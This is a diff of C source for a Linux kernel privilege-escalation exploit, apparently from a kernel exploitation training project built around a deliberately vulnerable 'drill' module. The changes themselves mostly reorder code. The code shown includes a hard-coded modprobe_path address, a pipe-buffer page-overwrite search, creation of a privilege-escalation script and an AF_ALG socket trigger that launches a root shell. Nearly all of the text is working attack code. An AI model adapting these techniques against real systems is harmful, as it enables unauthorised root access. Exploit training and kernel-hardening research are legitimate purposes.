@@ -29,20 +29,19 @@
 
 #define _GNU_SOURCE
 
-#include "drill.h"
-#include <sys/resource.h>
-#include <sched.h>
-#include <stdlib.h>
 #include <stdio.h>
 #include <fcntl.h>
-#include <assert.h>
 #include <unistd.h>
 #include <string.h>
+#include <stdlib.h>
+#include <assert.h>
+#include <sched.h>
 #include <sys/user.h>
 #include <sys/mman.h>
-#include <stdbool.h>
 #include <sys/socket.h>
+#include <sys/resource.h>
 #include <linux/if_alg.h>
+#include "drill.h"
 
 /* clang-format off */
 #define CPU_PARTIAL		120
@@ -55,29 +54,125 @@
 #define PB_PER_SLAB_SLOT	2
 #define PIPE_CAPACITY		PAGE_SIZE * PB_PER_SLAB_SLOT
 
-#define KMOD_PATH_LEN		256
 #define MODPROBE_PTR		0xffffffff82d486e0UL
 
 #define VIRTUAL_TO_PAGE(addr) \
 	((((addr) - 0xffffffff80000000UL) / 0x1000) * 0x40 + 0xffffea0000000000UL)
 /* clang-format on */
 
-void trigger_modprobe_sock(void)
+int increase_fd_limit(void)
 {
-	struct sockaddr_alg sa = { .salg_family = AF_ALG, .salg_type = "dummy" };
-	int alg_fd = -1;
+	struct rlimit rlim;
 
-	printf("[!] triggering modprobe using AF_ALG socket to launch the root shell...\n");
-	alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
-	bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa));
-	printf("[!] root shell is finished\n");
-
-	if (alg_fd >= 0) {
-		if (close(alg_fd) < 0)
-			perror("[-] close alg_fd");
+	if (getrlimit(RLIMIT_NOFILE, &rlim) == -1) {
+		perror("[-] getrlimit");
+		return EXIT_FAILURE;
 	}
+
+	rlim.rlim_cur = rlim.rlim_max;
+	if (setrlimit(RLIMIT_NOFILE, &rlim) == -1) {
+		perror("[-] setrlimit");
+		return EXIT_FAILURE;
+	}
+
+	if (getrlimit(RLIMIT_NOFILE, &rlim) == -1) {
+		perror("[-] getrlimit");
+		return EXIT_FAILURE;
+	}
+
+	printf("[+] set maximum file descriptors limit: %ld\n", rlim.rlim_cur);
+
+	return EXIT_SUCCESS;
 }
 
+int do_cpu_pinning(int cpu_n)
+{
+	int ret = 0;
+	cpu_set_t single_cpu;
+
+	CPU_ZERO(&single_cpu);
+	CPU_SET(cpu_n, &single_cpu);
+
+	ret = sched_setaffinity(0, sizeof(single_cpu), &single_cpu);
+	if (ret != 0) {
+		perror("[-] sched_setaffinity");
+		return EXIT_FAILURE;
+	}
+
+	printf("[+] pinned to CPU #%d\n", cpu_n);
+	return EXIT_SUCCESS;
+}
+
+int act(int act_fd, int code, int n, char *args)
+{
+	char buf[DRILL_ACT_SIZE] = { 0 };
+	size_t len = 0;
+	ssize_t bytes = 0;
+
+	if (args)
+		snprintf(buf, DRILL_ACT_SIZE, "%d %d %s", code, n, args);
+	else
+		snprintf(buf, DRILL_ACT_SIZE, "%d %d", code, n);
+
+	len = strlen(buf) + 1; /* with null byte */
+	assert(len <= DRILL_ACT_SIZE);
+
+	bytes = write(act_fd, buf, len);
+	if (bytes <= 0) {
+		perror("[-] write");
+		return EXIT_FAILURE;
+	}
+	if (bytes != len) {
+		printf("[-] wrote only %zd bytes to drill_act\n", bytes);
+		return EXIT_FAILURE;
+	}
+
+	return EXIT_SUCCESS;
+}
+
+/* From include/linux/kmod.h */
+#define KMOD_PATH_LEN 256
+
+int get_modprobe_path(char *buf, size_t buf_size)
+{
+	int fd = -1;
+	ssize_t bytes = 0;
+	int ret = EXIT_FAILURE;
+	size_t len = 0;
+
+	fd = open("/proc/sys/kernel/modprobe", O_RDONLY);
+	if (fd < 0) {
+		perror("[-] open modprobe");
+		return EXIT_FAILURE;
+	}
+
+	bytes = read(fd, buf, buf_size);
+	buf[buf_size - 1] = 0;
+
+	ret = close(fd);
+	if (ret != 0)
+		perror("[-] close modprobe");
+
+	if (bytes < 0) {
+		perror("[-] read modprobe");
+		return EXIT_FAILURE;
+	}
+
+	len = strlen(buf);
+	if (len < 1) {
+		printf("[-] invalid contents of /proc/sys/kernel/modprobe\n");
+		return EXIT_FAILURE;
+	}
+	if (buf[len - 1] != '\n') {
+		printf("[-] unexpected contents of /proc/sys/kernel/modprobe\n");
+		return EXIT_FAILURE;
+	}
+	buf[len - 1] = 0; /* skip the line feed '\n' */
+
+	return EXIT_SUCCESS;
+}
+
+/* Fileless approach */
 int prepare_privesc_script(char *path, size_t path_size, char *modprobe_path)
 {
 	pid_t pid = getpid();
@@ -134,90 +229,6 @@ int prepare_privesc_script(char *path, size_t path_size, char *modprobe_path)
 	return EXIT_SUCCESS;
 }
 
-int get_modprobe_path(char *buf, size_t buf_size)
-{
-	int fd = -1;
-	ssize_t bytes = 0;
-	int ret = EXIT_FAILURE;
-	size_t len = 0;
-
-	fd = open("/proc/sys/kernel/modprobe", O_RDONLY);
-	if (fd < 0) {
-		perror("[-] open modprobe");
-		return EXIT_FAILURE;
-	}
-
-	bytes = read(fd, buf, buf_size);
-	buf[buf_size - 1] = 0;
-
-	ret = close(fd);
-	if (ret != 0)
-		perror("[-] close modprobe");
-
-	if (bytes < 0) {
-		perror("[-] read modprobe");
-		return EXIT_FAILURE;
-	}
-
-	len = strlen(buf);
-	if (len < 1) {
-		printf("[-] invalid contents of /proc/sys/kernel/modprobe\n");
-		return EXIT_FAILURE;
-	}
-	if (buf[len - 1] != '\n') {
-		printf("[-] unexpected contents of /proc/sys/kernel/modprobe\n");
-		return EXIT_FAILURE;
-	}
-	buf[len - 1] = 0; /* skip the line feed '\n' */
-
-	return EXIT_SUCCESS;
-}
-
-int do_cpu_pinning(int cpu_n)
-{
-	int ret = 0;
-	cpu_set_t single_cpu;
-
-	CPU_ZERO(&single_cpu);
-	CPU_SET(cpu_n, &single_cpu);
-
-	ret = sched_setaffinity(0, sizeof(single_cpu), &single_cpu);
-	if (ret != 0) {
-		perror("[-] sched_setaffinity");
-		return EXIT_FAILURE;
-	}
-
-	printf("[+] pinned to CPU #%d\n", cpu_n);
-	return EXIT_SUCCESS;
-}
-
-int act(int act_fd, int code, int n, char *args)
-{
-	char buf[DRILL_ACT_SIZE] = { 0 };
-	size_t len = 0;
-	ssize_t bytes = 0;
-
-	if (args)
-		snprintf(buf, DRILL_ACT_SIZE, "%d %d %s", code, n, args);
-	else
-		snprintf(buf, DRILL_ACT_SIZE, "%d %d", code, n);
-
-	len = strlen(buf) + 1; /* with null byte */
-	assert(len <= DRILL_ACT_SIZE);
-
-	bytes = write(act_fd, buf, len);
-	if (bytes <= 0) {
-		perror("[-] write");
-		return EXIT_FAILURE;
-	}
-	if (bytes != len) {
-		printf("[-] wrote only %zd bytes to drill_act\n", bytes);
-		return EXIT_FAILURE;
-	}
-
-	return EXIT_SUCCESS;
-}
-
 int search_and_overwrite_modprobe(int pipe_fds[PIPES_N][2], char *pipe_data,
 				  const char *modprobe_path, const char *privesc_script_path,
 				  int victim_pipe)
@@ -240,29 +251,21 @@ int search_and_overwrite_modprobe(int pipe_fds[PIPES_N][2], char *pipe_data,
 	return EXIT_FAILURE;
 }
 
-int increase_fd_limit(void)
+/* See https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch */
+void trigger_modprobe_sock(void)
 {
-	struct rlimit rlim;
+	struct sockaddr_alg sa = { .salg_family = AF_ALG, .salg_type = "dummy" };
+	int alg_fd = -1;
 
-	if (getrlimit(RLIMIT_NOFILE, &rlim) == -1) {
-		perror("[-] getrlimit");
-		return EXIT_FAILURE;
+	printf("[!] triggering modprobe using AF_ALG socket to launch the root shell...\n");
+	alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
+	bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa));
+	printf("[!] root shell is finished\n");
+
+	if (alg_fd >= 0) {
+		if (close(alg_fd) < 0)
+			perror("[-] close alg_fd");
 	}
-
-	rlim.rlim_cur = rlim.rlim_max;
-	if (setrlimit(RLIMIT_NOFILE, &rlim) == -1) {
-		perror("[-] setrlimit");
-		return EXIT_FAILURE;
-	}
-
-	if (getrlimit(RLIMIT_NOFILE, &rlim) == -1) {
-		perror("[-] getrlimit");
-		return EXIT_FAILURE;
-	}
-
-	printf("[+] set maximum file descriptors limit: %ld\n", rlim.rlim_cur);
-
-	return EXIT_SUCCESS;
 }
 
 int main(void)
@@ -275,8 +278,9 @@ int main(void)
 	int pipe_ret = -1;
 	int pipe_fds[PIPES_N][2];
 	char err_act[64];
-	bool success = false;
+	int success = 0;
 
+	printf("begin as: uid=%d, euid=%d\n", getuid(), geteuid());
 	ret = increase_fd_limit();
 	if (ret == EXIT_FAILURE)
 		goto end;
@@ -366,7 +370,7 @@ int main(void)
 		ret = search_and_overwrite_modprobe(pipe_fds, pipe_data, modprobe_path,
 						    privesc_script_path, i);
 		if (ret == EXIT_SUCCESS) {
-			success = true;
+			success = 1;
 			break;
 		} else {
 			/*
